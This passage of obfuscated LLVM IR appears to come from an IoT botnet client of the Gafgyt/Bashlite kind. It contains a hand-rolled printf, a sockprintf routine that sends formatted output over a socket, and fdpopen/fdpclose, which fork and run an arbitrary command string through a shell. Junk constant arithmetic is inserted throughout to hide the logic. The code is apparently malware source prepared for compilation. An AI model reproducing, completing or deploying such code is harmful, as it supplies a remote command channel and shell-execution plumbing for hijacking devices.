  %240 = sub i32 0, %237
  %241 = add i32 %239, %240
  %242 = sub i32 0, %241
  %243 = add nsw i32 %238, %237
  store i32 %242, i32* %9, align 4
  br label %331

; <label>:244:                                    ; preds = %208
  %245 = load i8*, i8** %5, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 117
  br i1 %248, label %249, label %280

; <label>:249:                                    ; preds = %244
  %250 = load i8**, i8*** %4, align 8
  %251 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %252 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 0
  %253 = load i32, i32* %252, align 8
  %254 = icmp ule i32 %253, 40
  br i1 %254, label %255, label %263

; <label>:255:                                    ; preds = %249
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 3
  %257 = load i8*, i8** %256, align 8
  %258 = getelementptr i8, i8* %257, i32 %253
  %259 = bitcast i8* %258 to i32*
  %260 = sub i32 0, 8
  %261 = sub i32 %253, %260
  %262 = add i32 %253, 8
  store i32 %261, i32* %252, align 8
  br label %268

; <label>:263:                                    ; preds = %249
  %264 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %251, i32 0, i32 2
  %265 = load i8*, i8** %264, align 8
  %266 = bitcast i8* %265 to i32*
  %267 = getelementptr i8, i8* %265, i32 8
  store i8* %267, i8** %264, align 8
  br label %268

; <label>:268:                                    ; preds = %263, %255
  %269 = phi i32* [ %259, %255 ], [ %266, %263 ]
  %270 = load i32, i32* %269, align 4
  %271 = load i32, i32* %7, align 4
  %272 = load i32, i32* %8, align 4
  %273 = call i32 @printi(i8** %250, i32 %270, i32 10, i32 0, i32 %271, i32 %272, i32 97)
  %274 = load i32, i32* %9, align 4
  %275 = sub i32 0, %274
  %276 = sub i32 0, %273
  %277 = add i32 %275, %276
  %278 = sub i32 0, %277
  %279 = add nsw i32 %274, %273
  store i32 %278, i32* %9, align 4
  br label %331

; <label>:280:                                    ; preds = %244
  %281 = load i8*, i8** %5, align 8
  %282 = load i8, i8* %281, align 1
  %283 = zext i8 %282 to i32
  %284 = icmp eq i32 %283, 99
  br i1 %284, label %285, label %318

; <label>:285:                                    ; preds = %280
  %286 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %287 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 8
  %289 = icmp ule i32 %288, 40
  br i1 %289, label %290, label %298

; <label>:290:                                    ; preds = %285
  %291 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 3
  %292 = load i8*, i8** %291, align 8
  %293 = getelementptr i8, i8* %292, i32 %288
  %294 = bitcast i8* %293 to i32*
  %295 = sub i32 0, 8
  %296 = sub i32 %288, %295
  %297 = add i32 %288, 8
  store i32 %296, i32* %287, align 8
  br label %303

; <label>:298:                                    ; preds = %285
  %299 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %286, i32 0, i32 2
  %300 = load i8*, i8** %299, align 8
  %301 = bitcast i8* %300 to i32*
  %302 = getelementptr i8, i8* %300, i32 8
  store i8* %302, i8** %299, align 8
  br label %303

; <label>:303:                                    ; preds = %298, %290
  %304 = phi i32* [ %294, %290 ], [ %301, %298 ]
  %305 = load i32, i32* %304, align 4
  %306 = trunc i32 %305 to i8
  %307 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %306, i8* %307, align 1
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %308, align 1
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %311 = load i32, i32* %7, align 4
  %312 = load i32, i32* %8, align 4
  %313 = call i32 @prints(i8** %309, i8* %310, i32 %311, i32 %312)
  %314 = load i32, i32* %9, align 4
  %315 = sub i32 0, %313
  %316 = sub i32 %314, %315
  %317 = add nsw i32 %314, %313
  store i32 %316, i32* %9, align 4
  br label %331

; <label>:318:                                    ; preds = %280
  br label %330

; <label>:319:                                    ; preds = %17
  br label %320

; <label>:320:                                    ; preds = %319, %35
  %321 = load i8**, i8*** %4, align 8
  %322 = load i8*, i8** %5, align 8
  %323 = load i8, i8* %322, align 1
  %324 = zext i8 %323 to i32
  call void @printchar(i8** %321, i32 %324)
  %325 = load i32, i32* %9, align 4
  %326 = add i32 %325, -1236375229
  %327 = add i32 %326, 1
  %328 = sub i32 %327, -1236375229
  %329 = add nsw i32 %325, 1
  store i32 %328, i32* %9, align 4
  br label %330

; <label>:330:                                    ; preds = %320, %318
  br label %331

; <label>:331:                                    ; preds = %330, %303, %268, %232, %197, %161, %124
  %332 = load i8*, i8** %5, align 8
  %333 = getelementptr inbounds i8, i8* %332, i32 1
  store i8* %333, i8** %5, align 8
  br label %12

; <label>:334:                                    ; preds = %29, %12
  %335 = load i8**, i8*** %4, align 8
  %336 = icmp ne i8** %335, null
  br i1 %336, label %337, label %340

; <label>:337:                                    ; preds = %334
  %338 = load i8**, i8*** %4, align 8
  %339 = load i8*, i8** %338, align 8
  store i8 0, i8* %339, align 1
  br label %340

; <label>:340:                                    ; preds = %337, %334
  %341 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %342 = bitcast %struct.__va_list_tag* %341 to i8*
  call void @llvm.va_end(i8* %342)
  %343 = load i32, i32* %9, align 4
  ret i32 %343
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %55

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %28, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %31

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %11, align 4
  br label %28

; <label>:28:                                     ; preds = %21
  %29 = load i8*, i8** %12, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %12, align 8
  br label %17

; <label>:31:                                     ; preds = %17
  %32 = load i32, i32* %11, align 4
  %33 = load i32, i32* %7, align 4
  %34 = icmp sge i32 %32, %33
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %31
  store i32 0, i32* %7, align 4
  br label %42

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* %11, align 4
  %38 = load i32, i32* %7, align 4
  %39 = sub i32 0, %37
  %40 = add i32 %38, %39
  %41 = sub nsw i32 %38, %37
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %36, %35
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 %43, -1
  %45 = xor i32 2, -1
  %46 = xor i32 -888164906, -1
  %47 = or i32 %44, %45
  %48 = or i32 -888164906, %46
  %49 = xor i32 %47, -1
  %50 = and i32 %49, %48
  %51 = and i32 %43, 2
  %52 = icmp ne i32 %50, 0
  br i1 %52, label %53, label %54

; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 1, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %80, label %62

; <label>:62:                                     ; preds = %55
  br label %63

; <label>:63:                                     ; preds = %74, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %79

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add i32 %69, 1058019878
  %71 = add i32 %70, 1
  %72 = sub i32 %71, 1058019878
  %73 = add nsw i32 %69, 1
  store i32 %72, i32* %9, align 4
  br label %74

; <label>:74:                                     ; preds = %66
  %75 = load i32, i32* %7, align 4
  %76 = sub i32 0, -1
  %77 = sub i32 %75, %76
  %78 = add nsw i32 %75, -1
  store i32 %77, i32* %7, align 4
  br label %63

; <label>:79:                                     ; preds = %63
  br label %80

; <label>:80:                                     ; preds = %79, %55
  br label %81

; <label>:81:                                     ; preds = %95, %80
  %82 = load i8*, i8** %6, align 8
  %83 = load i8, i8* %82, align 1
  %84 = icmp ne i8 %83, 0
  br i1 %84, label %85, label %98

; <label>:85:                                     ; preds = %81
  %86 = load i8**, i8*** %5, align 8
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = zext i8 %88 to i32
  call void @printchar(i8** %86, i32 %89)
  %90 = load i32, i32* %9, align 4
  %91 = sub i32 %90, 1763051376
  %92 = add i32 %91, 1
  %93 = add i32 %92, 1763051376
  %94 = add nsw i32 %90, 1
  store i32 %93, i32* %9, align 4
  br label %95

; <label>:95:                                     ; preds = %85
  %96 = load i8*, i8** %6, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %6, align 8
  br label %81

; <label>:98:                                     ; preds = %81
  br label %99

; <label>:99:                                     ; preds = %109, %98
  %100 = load i32, i32* %7, align 4
  %101 = icmp sgt i32 %100, 0
  br i1 %101, label %102, label %115

; <label>:102:                                    ; preds = %99
  %103 = load i8**, i8*** %5, align 8
  %104 = load i32, i32* %10, align 4
  call void @printchar(i8** %103, i32 %104)
  %105 = load i32, i32* %9, align 4
  %106 = sub i32 0, 1
  %107 = sub i32 %105, %106
  %108 = add nsw i32 %105, 1
  store i32 %107, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %102
  %110 = load i32, i32* %7, align 4
  %111 = sub i32 %110, 374780902
  %112 = add i32 %111, -1
  %113 = add i32 %112, 374780902
  %114 = add nsw i32 %110, -1
  store i32 %113, i32* %7, align 4
  br label %99

; <label>:115:                                    ; preds = %99
  %116 = load i32, i32* %9, align 4
  ret i32 %116
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %131

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = add i32 0, -1872727220
  %45 = sub i32 %44, %43
  %46 = sub i32 %45, -1872727220
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %75, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %87

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %75

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 0, 48
  %65 = add i32 %63, %64
  %66 = sub nsw i32 %63, 48
  %67 = sub i32 %65, -1162447993
  %68 = sub i32 %67, 10
  %69 = add i32 %68, -1162447993
  %70 = sub nsw i32 %65, 10
  %71 = load i32, i32* %18, align 4
  %72 = sub i32 0, %69
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, %69
  store i32 %73, i32* %18, align 4
  br label %75

; <label>:75:                                     ; preds = %62, %56
  %76 = load i32, i32* %18, align 4
  %77 = sub i32 %76, -19224971
  %78 = add i32 %77, 48
  %79 = add i32 %78, -19224971
  %80 = add nsw i32 %76, 48
  %81 = trunc i32 %79 to i8
  %82 = load i8*, i8** %17, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 -1
  store i8* %83, i8** %17, align 8
  store i8 %81, i8* %83, align 1
  %84 = load i32, i32* %11, align 4
  %85 = load i32, i32* %21, align 4
  %86 = udiv i32 %85, %84
  store i32 %86, i32* %21, align 4
  br label %53

; <label>:87:                                     ; preds = %53
  %88 = load i32, i32* %19, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %119

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* %13, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %115

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %14, align 4
  %95 = xor i32 %94, -1
  %96 = xor i32 2, -1
  %97 = xor i32 1017091513, -1
  %98 = or i32 %95, %96
  %99 = or i32 1017091513, %97
  %100 = xor i32 %98, -1
  %101 = and i32 %100, %99
  %102 = and i32 %94, 2
  %103 = icmp ne i32 %101, 0
  br i1 %103, label %104, label %115

; <label>:104:                                    ; preds = %93
  %105 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %105, i32 45)
  %106 = load i32, i32* %20, align 4
  %107 = sub i32 0, 1
  %108 = sub i32 %106, %107
  %109 = add nsw i32 %106, 1
  store i32 %108, i32* %20, align 4
  %110 = load i32, i32* %13, align 4
  %111 = add i32 %110, 1029485363
  %112 = add i32 %111, -1
  %113 = sub i32 %112, 1029485363
  %114 = add nsw i32 %110, -1
  store i32 %113, i32* %13, align 4
  br label %118

; <label>:115:                                    ; preds = %93, %90
  %116 = load i8*, i8** %17, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 -1
  store i8* %117, i8** %17, align 8
  store i8 45, i8* %117, align 1
  br label %118

; <label>:118:                                    ; preds = %115, %104
  br label %119

; <label>:119:                                    ; preds = %118, %87
  %120 = load i32, i32* %20, align 4
  %121 = load i8**, i8*** %9, align 8
  %122 = load i8*, i8** %17, align 8
  %123 = load i32, i32* %13, align 4
  %124 = load i32, i32* %14, align 4
  %125 = call i32 @prints(i8** %121, i8* %122, i32 %123, i32 %124)
  %126 = sub i32 0, %120
  %127 = sub i32 0, %125
  %128 = add i32 %126, %127
  %129 = sub i32 0, %128
  %130 = add nsw i32 %120, %125
  store i32 %129, i32* %8, align 4
  br label %131

; <label>:131:                                    ; preds = %119, %25
  %132 = load i32, i32* %8, align 4
  ret i32 %132
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.131, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %69

